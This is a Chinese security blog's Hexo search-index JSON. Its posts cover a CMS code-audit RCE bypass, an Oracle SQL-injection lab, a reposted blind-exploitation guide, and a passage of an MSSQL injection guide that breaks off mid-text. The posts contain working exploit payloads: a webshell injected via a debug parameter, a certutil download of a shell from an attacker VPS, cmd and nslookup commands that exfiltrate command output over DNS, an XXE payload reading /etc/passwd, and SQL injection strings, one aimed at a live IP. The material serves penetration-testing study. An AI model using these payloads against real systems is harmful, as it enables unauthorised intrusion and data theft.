{"meta":{"title":"jasson个人博客","subtitle":"来自一个安全小白的自述～","description":"专注于Web、内网渗透、红蓝攻防、代码审计，分享知识，分享生活。","author":"jasson","url":"https://j-jasson2.github.io","root":"/"},"pages":[{"title":"about","text":"","path":"about/index.html"},{"title":"link","text":"","path":"link/index.html"},{"title":"categories","text":"","path":"categories/index.html"},{"title":"messageboard","text":"","path":"messageboard/index.html"},{"title":"tags","text":"","path":"tags/index.html"},{"title":"timeline","text":"","path":"timeline/index.html"}],"posts":[{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new &quot;My New Post&quot; More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2021/08/04/hello-world/"},{"title":"某cms代码审计RCE&艰难bypass(思路清奇)","text":"0x01 前言闲来无事挖挖漏洞，发现一个经过了一些过滤的漏洞，踩了无数的坑，然后冥思苦想了许多方法，终于找到了一个点，使得可以进行命令执行与getshell。这里的漏洞点不值一提，但是因为绕过方法挺好玩的，故在这里分享一下思路，大佬勿喷～思路不唯一，也希望有其他方法的话，大佬们可以不吝赐教，在评论区留下具体方法，谢谢大家～ 0x02 代码审计环境此次代码审计采用的是phpstudy一键式搭建。phpstudy下载地址：https://www.xp.cn/download.html代码审计分析工具：nopad++，seay源代码分析工具 0x03 开始审计话不多说，先看一下目录结构，很明显的tp5框架在\\thinkphp\\base.php文件中也可以看到对应的tp版本号（5.0.24版本好像有个反序列化，其实也可以尝试一下）虽然seay用现有的规则扫描扫出来的漏洞不太准确，但是帮忙定位危险函数还是可以的，所以我一般都会先进行自动审计。接下来就是一个个漏洞分析了，都点进去看一看。其实只需要看2点：1.用户可以控制输入的内容2.输入的内容被放到危险函数中进行了执行(需要进行流程跟进的话还是推荐使用phpstorm工具的，我这里因为是在虚拟机中，就简单用了seay和nopad++代替) 0x04 漏洞点分析1、具体我发现这个漏洞是在/app/admin/controller/api.php文件下的debug函数 1234567891011121314151617181920public function debug() &#123; $path = &#x27;app/extra/debug.php&#x27;; $file = include $path; $config = array( &#x27;name&#x27; =&gt; input(&#x27;id&#x27;), ); $config = preg_replace(&quot;/[?&gt;&lt;?]/&quot;, &#x27;&#x27;, $config); $res = array_merge($file, $config); $str = &#x27;&lt;?php return [&#x27;; foreach ($res as $key =&gt; $value) &#123; $str .= &#x27;\\&#x27;&#x27; . $key . &#x27;\\&#x27;&#x27; . &#x27;=&gt;&#x27; . &#x27;\\&#x27;&#x27; . $value . &#x27;\\&#x27;&#x27; . &#x27;,&#x27;; &#125; $str .= &#x27;]; &#x27;; if (file_put_contents($path, $str)) &#123; return json(array(&#x27;code&#x27; =&gt; 1, &#x27;msg&#x27; =&gt; &#x27;操作成功&#x27;)); &#125; else &#123; return json(array(&#x27;code&#x27; =&gt; 0, &#x27;msg&#x27; =&gt; &#x27;操作失败&#x27;)); &#125; &#125; 在代码第15行通过file_put_contents()函数将id传参的内容写入到app/extra/debug.php文件中。2、可以看到上面进行了一些过滤，将&lt;&gt;和?替换为空 1$config = preg_replace(&quot;/[?&gt;&lt;?]/&quot;, &#x27;&#x27;, $config); 3、这里直接将不太清晰，实战演示一下，首先访问后台路径，这里有个debug功能，就是上面debug函数的功能点。http://127.0.0.1/index.php/admin/4、具体使用时发现报错了，那就直接访问对应的函数，路由规则就是/index.php/目录-文件-函数.html?传参=。这里我传参123进行测试http://127.0.0.1/index.php/admin-api-debug.html?id=1235、在debug.php文件中可以看到123是放到数组中的值处，而我们可以控制这里的值。 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;,]; 6、下面讲解我进行绕过的思路以及遇到的坑。 0x05 绕过思路第一次踩坑1、首先，这里因为没有过滤单引号和中括号，所以我们可以手动闭合 12payload:http://127.0.0.1/index.php/admin-api-debug.html?id=123%27];phpinfo();// 这里可以看到数据是成功写入进文件中的 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;];phpinfo();//&#x27;,]; 2、访问debug.php文件试试发现，页面并没有返回想要的内容3、这里我想了好久，想着试试更换echo输出看看 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;];echo &#x27;12344321&#x27;;//&#x27;,]; 在页面中并没有输出4、查阅资料之后理解了return后代码不再向下执行，此路不通参考链接：https://www.cnblogs.com/gzpu/p/13736420.html 第二次踩坑1、既然不能通过分号结束代码后执行其他代码的话，我能不能在return中执行代码呢，此处进行了尝试 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;,eval($_REQUEST[1]);&#x27;&#x27;,]; 于是……页面报错了2、再试试换行 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27,%0aeval($_REQUEST[1]);%27 好的，还是不执行 第三次，渐渐好起来了1、因为代码执行行不通，那我就想着试试命令执行看可不可以。先申请一个dnslog，链接：http://dnslog.cn/2、使用.拼接反引号执行命令 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27].`ping%20123.yh6nta.dnslog.cn`;// 查看文件情况 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;].`ping 123.yh6nta.dnslog.cn`;//&#x27;,]; 访问看看，发现报错了，但是dnslog记录了数据，命令执行成功了 3、这里报错怀疑是使用了点进行拼接，两边的字符类型不匹配，因为命令执行可以使用符号进行连接，所以在这里将点替换成&amp;。因为&amp;在url中还有其他含义，所以先进行url编码。 123123&#x27;]&amp;`ping 123.yh6nta.dnslog.cn`;//#url编码123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F 查看文件情况 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;]&amp;`ping 123.yh6nta.dnslog.cn`;//&#x27;,]; 访问debug.php文件，页面没有报错，而且dnslog成功回显4、既然可以执行命令了，很明显这里是无回显的情况，那么怎么拿到shell呢PHP无回显情况下的渗透测试可以参考此文章：https://xz.aliyun.com/t/9916 Linux系统1234这里不细说，只要命令没有&lt;、&gt;、?即可1、nc反弹shell2、配合其他组件，如redis等3、等等～ Windows系统1、第一次尝试123使用`ping `whoami`.yh6nta.dnslog.cn`，失败使用`ping /`whoami/`.yh6nta.dnslog.cn`，失败使用`ping %系统变量%.yh6nta.dnslog.cn`，失败 2、第二次尝试使用系统命令外带数据，首先我在文件中直接修改，发现可以成功外带数据 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;]&amp;`cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,-1%.yh6nta.dnslog.cn)&amp;del temp`;//&#x27;,]; 后面发现，这条命令中含有一个&gt;号，苦恼好久，暂时放弃。不过我觉得这个命令可以适当优化，然后就可以使用了。 3、第三次尝试，成功getshell这里借鉴了XX师傅的建议，通过命令下载文件getshell 1、首先需要准备一个文件，内容为一句话木马，放到vps的web服务中。（当然起一个python的http服务也可以，主要是要可以访问获取。） 2、windows中可以使用certutil下载文件 123456#payload：&#x27;]&amp;`certutil -urlcache -split -f http://vps地址:83/shell 1.php`;//#url编码：%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F#通过id传参：http://127.0.0.1/index.php/admin-api-debug.html?id=%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F 3、查看debug.php文件情况4、访问debug.php后，会在当前目录生成1.php，内容为一句话木马5、执行phpinfo函数 原来竟然如此简单？1、因为前面命令执行可以使用符号进行连接，我想着在代码中也试试，看看能不能直接执行一句话木马（测试了｜、｜｜、&amp;、&amp;&amp;，只有&amp;和&amp;&amp;的时候可以执行）同样先进行url编码 123123&#x27;]&amp;&amp;eval($_REQUEST[1]);//#url编码123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F 1http://127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F 在文件中是这样的 1&lt;?php return [&#x27;name&#x27;=&gt;&#x27;123&#x27;]&amp;&amp;eval($_REQUEST[1]);//&#x27;,]; 尝试访问，成功执行代码居然就这样就可以了…… 0x06 总结本次代码审计发现漏洞很快，但是利用起来整了我2天，还是在师傅们的帮助下完成的深入利用。忽然发现自己对于编程语言的基础还很不扎实，一些简单处理的地方居然思考了那么久，在之前发现漏洞的情况下，一般都是可以直接利用了，此次bypass的时候发现了很多不足。在以后的代码审计中，简单利用的漏洞只会越来越少，我还需要多深入学习代码知识，才能从一些过滤薄弱点出发，发现漏洞。嗯嗯，总结一句话，不论是学什么东西，基础很重要很重要！","path":"2021/08/03/某cms代码审计RCE&艰难bypass(思路清奇)/"},{"title":"Oracle数据库注入环境搭建","text":"0x01 安装Oracle数据库1、首先下载数据库安装软件具体可以从参考这里，我是从他的百度云下载的https://blog.csdn.net/qq_32786873/article/details/811872082、点击setup.exe安装即可（安装过程不过多阐述，没什么太大区别，就下一步下一步即可） 3、开启oracle数据库 打开cmd，连接数据库 12345C:\\Users\\user&gt;sqlplus请输入用户名: system输入口令:连接到:Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 防止网络不通，建议关闭防火墙4、使用navicat连接数据库（system:root）5、也可以使用sql plus新建用户 0x02 安装phpstudy1、phpstudy下载地址如下：http://public.xp.cn/upgrades/phpStudy20161103.zip这里推荐使用2016版本，因为我使用2018死活搭不成功安装过程很简单，设置安装路径，下一步下一步即可。2、切换版本为5.5.38，这里推荐这个因为我就是这个搭成功的。（如果显示需要安装VC扩展库的话，按照教程安装即可，我这里安装的是VC11的，链接放这了：https://www.php.cn/xiazai/download/1481）3、安装完之后，打开phpinfo也可以像我这样在C:\\phpStudy\\WWW目录下新建phpinfo.php文件，内容为： 1&lt;?php phpinfo();?&gt; 这里看到是32位的。 0x03 设置oci8扩展（这里我是死活不成功，弄了半天）1、首先在C:\\phpStudy\\php\\php-5.5.38目录下，修改php.ini的内容（搜索oci8，找到对应的扩展处，将前面的;删除即可。）2、之后就开始苦逼地调试环境了，最终弄好是根据这篇文章弄好的，链接如下：https://www.it1352.com/1713162.html在php路径下，打开cmd，输入如下命令： 12345678910111213141516C:\\phpStudy\\php\\php-5.5.38&gt;php.exe -mPHP Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0PHP Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27; - %1 不是有 效的 Win32 应用程序。 in Unknown on line 0Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_oci8_11g.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0PHP Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0Warning: PHP Startup: Unable to load dynamic library &#x27;C:\\phpStudy\\php\\php-5.5.38\\ext\\php_pdo_oci.dll&#x27; - %1 不是有效的 Win32 应用程序。 in Unknown on line 0 3、根据文章中所说，安装oracle instantclient，链接如下：https://www.oracle.com/database/technologies/instant-client/microsoft-windows-32-downloads.html因为数据库是11g的，所以安装11.1.x版本4、下载好之后解压，放入C:\\instantclient_11_15、设置环境变量，这一步很重要在此电脑右键属性 - 高级系统设置 - 环境变量 - 系统变量（Path） - 编辑增加这三个路径，注意顺序不要变，instantclient必须放在php的上面。6、验证，在cmd命令提示符中输入 1where oci* 出现instantclient的路径即可。7、重启计算机8、在php路径下，打开cmd，输入如下命令并查看结果（没有出现“不是有效的 Win32 应用程序”即可） 1php.exe --ri oci8 9、在phpinfo中搜索oci8，有如下界面表示扩展已经开启成功。（没有就重启phpstudy）当出现如下界面，环境就已经基本搭建好了。 0x04 创建漏洞测试环境1、 建立存在漏洞数据1、首先使用navicat连接数据库（这里有一个坑，连接时可能会出现oracle library is not loaded）在工具 - 选项处修改oci环境，选择之前数据库安装的路径，修改完后记得重启2、连接数据库之后，选择相应的用户，我这里是SYSTEM3、新建表TEST，设置如下字段4、添加如下数据（数据其实是任意的，随意添加即可）5、新建查询进行验证以上漏洞数据就简单搭建成功了。 2、搭建PHP站点1、将源码保存为oracle.php文件，放到C:\\phpStudy\\WWW目录下源码如下： 12345678910111213141516171819202122232425262728&lt;?php header(&quot;Content-Type:text/html;charset=utf-8&quot;); $id = @$_GET[&#x27;id&#x27;]; $dbstr =&quot;(DESCRIPTION =(ADDRESS = (PROTOCOL = TCP)(HOST =127.0.0.1)(PORT = 1521)) (CONNECT_DATA = (SERVER = DEDICATED) (SERVICE_NAME = orcl) (INSTANCE_NAME = orcl)))&quot;; //连接数据库的参数配置 $conn = oci_connect(&#x27;system&#x27;,&#x27;root&#x27;,$dbstr);//连接数据库，前两个参数分别是账号和密码 if (!$conn) &#123; $Error = oci_error();//错误信息 print htmlentities($Error[&#x27;message&#x27;]); exit; &#125; else &#123; echo &quot;&lt;h3&gt;Oracle 注入测试靶场&lt;/h3&gt;&quot;.&quot;&lt;br&gt;&quot;; $sql = &quot;select * from TEST where id=&quot;.$id;//sql查询语句 echo &quot;当前sql语句为：&quot;.$sql.&quot;&lt;br&gt;&quot;.&quot;&lt;br&gt;&quot;;//输出sql查询语句 $ora_b = oci_parse($conn,$sql); //编译sql语句 oci_execute($ora_b,OCI_DEFAULT); //执行 while($r=oci_fetch_row($ora_b)) //取回结果 &#123; $i=0; echo &quot;Id:&quot;.$r[$i++].&quot; &lt;/t&gt; &lt;br&gt;&quot;; echo &quot;Name:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; echo &quot;Age:&quot;.$r[$i++].&quot; &lt;/t&gt;&lt;br&gt; &quot;; &#125; &#125; oci_close($conn);//关闭连接?&gt; 2、访问http://localhost/oracle.php?id=1，返回如下界面表示搭建成功，数据库也成功连接了。 0x05 Oracle注入测试1、检测漏洞点1http://localhost/oracle.php?id=1 and 1=1 1http://localhost/oracle.php?id=1 and 1=2 2、显错注入1http://localhost/oracle.php?id=-1 union all select 1,(select user from dual),3,&#x27;4&#x27; from dual -- 3、报错注入1http://localhost/oracle.php?id=-1 and 1=ctxsys.drithsx.sn(1,(select user from dual)) -- 4、布尔盲注1http://localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SYSTEM&#x27;,1,0) from dual) -- 1http://localhost/oracle.php?id=1 and 1=(select decode(user,&#x27;SSSSS&#x27;,1,0) from dual) -- 5、延时盲注1http://localhost/oracle.php?id=1 and 1=(select decode(substr(user,1,1),&#x27;S&#x27;,dbms_pipe.receive_message(&#x27;o&#x27;,5),0) from dual) -- 6、外带数据1http://localhost/oracle.php?id=1 and (select utl_inaddr.get_host_address((select user from dual)||&#x27;.pgx519.dnslog.cn&#x27;) from dual)is not null -- 0x06 总结Oracle数据库注入测试只是简单测试了各种注入到效果，具体测试详情可以看我之前写的文章《Oracle数据库注入总结》。之前因为测试漏洞的时候没有找到很好的在线测试平台，并且自己搭建的时候遇到了各种各样的问题，这里解决问题后写成文章，希望对于想自己搭建注入靶场的安全从业人员有所帮助～","path":"2021/08/01/Oracle数据库注入环境搭建/"},{"title":"PHP无回显渗透测试总结","text":"本文转自先知社区：https://xz.aliyun.com/t/9916 作者：ajie 0x01前言在渗透测试过程中，开发不可能每一次都将结果输出到页面上，也就是漏洞无回显的情况，那么在这种情况下，我们可以通过dnslog判断漏洞存在，或者通过起一个python的http服务来判断，方法很多，下面主要进行一些情况的分析。 0x02无回显概念无回显，即执行的payload在站点没有输出，无法进行进一步操作。在渗透测试过程中，漏洞点不可能总是能够在返回页面进行输出，那么这时候就需要进行一些无回显利用了。 0x03不同漏洞的无回显1、SQL注入无回显SQL注入，作为OWASP常年占据榜首位置的漏洞，在无回显中也是常见的。当然SQL注入在无回显上已经具有了一定的解决措施。无回显我将其定义为页面没有输出我们想要得到的内容，下面以sqli-labs为例进行讲解。 1.1 布尔盲注 布尔盲注，盲注的一种，当网站通过查询语句的布尔值返回真假来输出页面信息的时候，查询语句为真，页面输出内容；查询语句为假，页面不输出内容。那么这里就可以通过构造等号判断，获取相应的字符的ascii码，最后还原出数据。具体测试过程如下：1、id传参1之后，页面返回有数据，这里明显不能进行显错注入了。2、在传参后面加个单引号，页面返回空，不显示错误信息，不能使用报错注入。3、通过拼接and 1=1和and 1=2，发现页面对于布尔值的真与假返回的页面结果也不同。 4、通过length()函数判断数据库库名的长度大于1。?id=1’ and length(database())&gt;1 %235、在大于8的时候页面返回空，所以数据库库名长度等于8。6、通过ascii()函数和substr ()截取函数获取数据库库名的第一个字符的ascii码?id=1’ and ascii(substr((select database()),1,1))&gt;97 %23?id=1’ and ascii(substr((select database()),1,1))=101 %23首先用大于号判断出大概所处的值，最后使用等于号验证ascii码的值。此处得出数据库库名的第一个字符的ascii码值为115，对应字符为s。7、更改截取的位置，判断后面的字符对应的ascii码值。?id=1’ and ascii(substr((select database()),2,1))=101 %23 1.2 延时盲注 延时盲注，一种盲注的手法。在渗透测试过程中当我们不能使用显错注入、报错注入以及布尔盲注无论布尔值为真还是为假，页面都返回一样之后，我们可以尝试使用延时盲注，通过加载页面的时间长度来判断数据是否成功。在PHP中有一个if()函数，语法为if(exp1,exp2,exp3)，当exp1返回为真时，执行exp2，返回为假时，执行exp3。配合延时函数sleep()来获取相应数据的ascii码，最后还原成数据。下面我将通过实例来介绍如今进行延时盲注。1、首先获取的页面如下，后面不论接上布尔值为真还是为假的，页面都返回一样，此时将不能使用布尔盲注。2、通过and拼接延时函数查看页面是否有延时回显。首先记录没有使用延时函数的页面返回时间，为4.*秒；使用sleep(5)延时5秒之后，页面响应时间为9.*秒，说明对于我们输入的sleep()函数进行了延时处理，此处存在延时盲注。3、通过延时注入判断数据库库名的长度。一个个测试发现当长度等于8时页面延时返回了，说明数据库库名长度为8。?id=2’ and if((length(database())=8),sleep(5),1) %234、与布尔盲注一样，将子查询的数据截断之后判断ascii码，相等时延时5秒。最后得到第一个字符的ascii码为115。?id=2’ and if((ascii(substr((select database()),1,1))=115),sleep(5),1) %235、后面替换截断的位置，测试后面的字符的ascii码值。最后得到对应的ascii码值为115 101 99 117 114 105 116 121。通过ascii解码工具解得数据库库名为security。 巧用dnslog进行SQL注入 前面介绍了SQL注入中的盲注，通过布尔盲注或者延时盲注来获取数据需要的步骤非常繁琐，不仅需要一个一个字符的获取，最后还需要进行ascii解码，这需要花费大量的时间与精力。为了加快渗透进程，以及降低获取数据的难度，这里介绍如何通过dnslog进行SQL注入。 Dnslog dnslog，即dns日志，会解析访问dns服务的记录并显示出来，常被用来测试漏洞是否存在以及无法获取数据的时候进行外带数据。简单来说，dnslog就是一个服务器，会记录所有访问它的记录，包括访问的域名、访问的IP以及时间。那么我们就可以通过子查询，拼接dnslog的域名，最后通过dns日志得到需要的数据。 Load_file()函数 数据库中的load_file()函数，可以加载服务器中的内容。load_file(‘c:/1.txt’)，读取文件并返回内容为字符串，使用load_file()函数获取数据需要有以下几个条件： 1.文件在服务器上 2.指定完整路径的文件 3.必须有FILE权限 UNC路径 UNC路径就是类似\\softer这样的形式的网络路径。它符合 \\服务器名\\服务器资源的格式。在Windows系统中常用于共享文件。如\\192.168.1.1\\共享文件夹名。 Dnslog注入实例演示1、打开实例站点，很明显这里是只能使用盲注的站点。2、通过order by判断出字段数为3。3、在dnslog网站申请一个dnslog域名：pcijrt.dnslog.cn4、通过load_file函数拼接查询数据库库名的子查询到dnslog的域名上，后面任意接一个不存在的文件夹名。最后将这个查询放到联合查询中，构造的payload如下： 12?id=1 &#x27; union select 1,2,load_file(concat(&#x27;//&#x27;,(select database()),&#x27;.pcijrt.dnslog.cn/abc&#x27;)) %23 5、执行语句之后在dnslog日志中获取到数据库库名为security。6、修改子查询里的内容，获取其他数据。 2、XSS无回显XSS无回显比较特殊，一般XSS漏洞的判断标准为弹框，但是有这样一种情况，在一个表单提交处，内容提交之后只会在页面显示提交成功与否，不会输出提交的内容，那么我们也就无法通过弹框来判断XSS漏洞存在与否。这时候就需要通过XSS盲打来进行攻击。下面通过Pikachu漏洞练习平台来进行实例讲解： 2.1 XSS盲打1、如图这里是一个提交看法的功能2、随便输入内容提交，告诉我们提交成功，没有将我输入的内容返回到页面中3、登录后台可以看到确实有数据回显4、输入弹框语句会在后台成功执行5、在渗透测试过程中我们无法登录后台进行查看，那么就需要盲打XSS，输入XSS平台的payload，坐等管理员查看内容后上钩。 2.2 通过dnslog判断漏洞存在12payload:&lt;img src=http://xss.t7y3wc.dnslog.cn&gt; 3、SSRF无回显SSRF即服务端请求伪造，一种由攻击者构造的通过服务器发起请求的攻击。测试代码如下： 123&lt;?php echo file_get_contents($_GET[&#x27;url&#x27;]);?&gt; 首先通过访问百度可以验证漏洞存在无回显情况即不进行输出，页面返回空这种情况可以通过dnslog或者python搭建http服务验证1、DNSLOGhttp://172.16.29.2/ssrf_test.php?url=http://ssrf.02c6ot.dnslog.cn2、python起的http服务 1python3 -m http.server 4545 http://172.16.29.2/ssrf_test.php?url=http://172.16.29.1:4545 4、XXE无回显因为XML是用来存储传输数据的，除了确实是业务需要，否则开发不可能会输出内容，也就是说你确实读取到了文件内容，但是没办法看到。XXE无回显问题当然也是可以通过在域名前面放入查询出的内容，将数据通过dns日志记录下来。XXE虽然不是通过DNSlog，但是也同样是外带数据。流程如下：在受害者网站中，我们通过请求攻击者VPS上的1.xml文件，文件内容为将某数据放在GET传参中去访问2.php。然后2.php中的内容为保存GET传参的数据，将数据放入到3.txt中。具体文件内容放在下面，里面的IP地址应该为攻击者的IP地址，这3个文件也是放在攻击者VPS上。1.xml 1&lt;!ENTITY% all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://攻击者的IP地址/2.php?id=%file;&#x27;&gt;&quot;&gt;%all; 2.php 1&lt;?php file_put_contents(&quot;3.txt&quot;,$_GET[&quot;id&quot;],FILE_APPEND);?&gt; 3.txt 1内容空 payload： 1234567&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;&lt;!ENTITY % remote SYSTEM&quot;http://服务器IP地址/xxe/1.xml&quot;&gt;%remote;%send;]&gt; 5、命令执行无回显简单的命令执行站点输入任何命令都无回显 5.1 Dnslog判断漏洞存在http://127.0.0.1/test_blind/exec.php?cmd=ping+lhg3du.dnslog.cn 5.2Dnslog外带数据5.2.1 获取windows用户名1http://127.0.0.1/test_blind/exec.php?cmd=ping+%USERNAME%.io5a5i.dnslog.cn windows常用变量： 1234567891011121314151617181920212223242526272829303132//变量 类型 描述//%ALLUSERSPROFILE% 本地 返回“所有用户”配置文件的位置。//%APPDATA% 本地 返回默认情况下应用程序存储数据的位置。//%CD% 本地 返回当前目录字符串。//%CMDCMDLINE% 本地 返回用来启动当前的 Cmd.exe 的准确命令行。//%CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。//%COMPUTERNAME% 系统 返回计算机的名称。//%COMSPEC% 系统 返回命令行解释器可执行程序的准确路径。//%DATE% 系统 返回当前日期。使用与 date /t 命令相同的格式。由 Cmd.exe 生成。有关 date 命令的详细信息，请参阅 Date。//%ERRORLEVEL% 系统 返回上一条命令的错误代码。通常用非零值表示错误。//%HOMEDRIVE% 系统 返回连接到用户主目录的本地工作站驱动器号。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%HOMEPATH% 系统 返回用户主目录的完整路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%HOMESHARE% 系统 返回用户的共享主目录的网络路径。基于主目录值而设置。用户主目录是在“本地用户和组”中指定的。//%LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。//%NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数目。//%OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。//%PATH% 系统 指定可执行文件的搜索路径。//%PATHEXT% 系统 返回操作系统认为可执行的文件扩展名的列表。//%PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯片体系结构。值：x86 或 IA64（基于 Itanium）。//%PROCESSOR_IDENTFIER% 系统 返回处理器说明。//%PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。//%PROCESSOR_REVISION% 系统 返回处理器的版本号。//%PROMPT% 本地 返回当前解释程序的命令提示符设置。由 Cmd.exe 生成。//%RANDOM% 系统 返回 0 到 32767 之间的任意十进制数字。由 Cmd.exe 生成。//%SYSTEMDRIVE% 系统 返回包含 Windows server operating system 根目录（即系统根目录）的驱动器。//%SYSTEMROOT% 系统 返回 Windows server operating system 根目录的位置。//%TEMP%和%TMP% 系统和用户 返回对当前登录用户可用的应用程序所使用的默认临时目录。有些应用程序需要 TEMP，而其他应用程序则需要 TMP。//%TIME% 系统 返回当前时间。使用与 time /t 命令相同的格式。由 Cmd.exe 生成。有关 time 命令的详细信息，请参阅 Time。//%USERDOMAIN% 本地 返回包含用户帐户的域的名称。//%USERNAME% 本地 返回当前登录的用户的名称。//%USERPROFILE% 本地 返回当前用户的配置文件的位置。//%WINDIR% 系统 返回操作系统目录的位置。 5.2.2 其他命令执行1cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,-1%.xxxx.ceye.io)&amp;del temp 1cmd /c ipconfig &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;FOR /F &quot;eol=- delims=&quot; %i IN (temp) DO (set _=%i &amp; cmd /c nslookup %_:~0,40%.xxxx.ceye.io &amp; cmd /c nslookup %_:~40,-1%.xxxx.ceye.io)&amp;del temp 通过POST传参测试传参的内容需要进行url编码Post传参Dnslog获取结果Base64解码获取内容 总结 在渗透测试过程中，无回显是很常见的，程序不可能将一些操作都回显到页面中，那么这种时候我们就需要外带数据来获取想要的内容。当然最好就是能够反弹shell，通过获取shell来执行命令，这样会舒服很多。 无回显的情况还有很多很多，这里简单介绍了几种，希望读者朋友们能够从中学到对于无回显的情况下如何进行渗透测试，方法很多，不固定，学习思路即可。","path":"2021/07/02/PHP无回显渗透测试总结/"},{"title":"MSSQL数据库注入全方位利用","text":"0x01 前言在渗透测试过程中遇到了MSSQL数据库，市面上也有一些文章，不过大多数讲述的都是如何快速利用注入漏洞getshell的，对于MSSQL数据库的注入漏洞没有很详细地描述。在这里我查阅了很多资料，希望在渗透测试过程中遇到了MSSQL数据库能够相对友好地进行渗透测试，文章针对实战性教学，在概念描述方面有不懂的还请自行百度，谢谢大家～ 0x02 注入前准备1、确定注入点1http://219.153.49.228:40574/new_list.asp?id=2 and 1=1 1http://219.153.49.228:40574/new_list.asp?id=2 and 1=2 2、判断是否为mssql数据库sysobjects为mssql数据库中独有的数据表，此处页面返回正常即可表示为mssql数据库。 1http://219.153.49.228:40574/new_list.asp?id=2 and (select count(*) from sysobjects)&gt;0 还可以通过MSSQL数据库中的延时函数进行判断，当语句执行成功，页面延时返回即表示为MSSQL数据库。 1http://219.153.49.228:40574/new_list.asp?id=2;WAITFOR DELAY &#x27;00:00:10&#x27;; -- asd 3、相关概念系统自带库MSSQL安装后默认带了6个数据库，其中4个系统级库：master，model，tempdb和msdb；2个示例库：Northwind Traders和pubs。这里了解一下系统级库： 1234master：主要为系统控制数据库，其中包括了所有配置信息、用户登录信息和当前系统运行情况。model：模版数据库tempdb：临时容器msdb：主要为用户使用，所有的告警、任务调度等都在这个数据库中。 系统自带表MSSQL数据库与Mysql数据库一样，有安装自带的数据表sysobjects和syscolumns等，其中需要了解的就是这两个数据表。 12sysobjects：记录了数据库中所有表，常用字段为id、name和xtype。syscolumns：记录了数据库中所有表的字段，常用字段为id、name和xtype。 就如字面意思所述，id为标识，name为对应的表名和字段名，xtype为所对应的对象类型。一般我们使用两个，一个’U’为用户所创建，一个’S’为系统所创建。其他对象类型如下： 1234567891011121314151617181920212223242526对象类型：AF = 聚合函数 (CLR)C = CHECK 约束D = DEFAULT（约束或独立）F = FOREIGN KEY 约束FN = SQL 标量函数FS = 程序集 (CLR) 标量函数FT = 程序集 (CLR) 表值函数IF = SQL 内联表值函数IT = 内部表P = SQL 存储过程PC = 程序集 (CLR) 存储过程PG = 计划指南PK = PRIMARY KEY 约束R = 规则（旧式，独立）RF = 复制筛选过程S = 系统基表SN = 同义词SQ = 服务队列TA = 程序集 (CLR) DML 触发器TF = SQL 表值函数TR = SQL DML 触发器U = 表（用户定义类型）UQ = UNIQUE 约束V = 视图X = 扩展存储过程 排序&amp;获取下一条数据mssql数据库中没有limit排序获取字段，但是可以使用top 1来显示数据中的第一条数据，后面与Oracle数据库注入一样，使用&lt;&gt;或not in 来排除已经显示的数据，获取下一条数据。但是与Oracle数据库不同的是使用not in的时候后面需要带上(‘’)，类似数组，也就是不需要输入多个not in来获取数据，这可以很大程序减少输入的数据量，如下： 1234#使用&lt;&gt;获取数据http://219.153.49.228:40574/new_list.asp?id=-2 union all select top 1 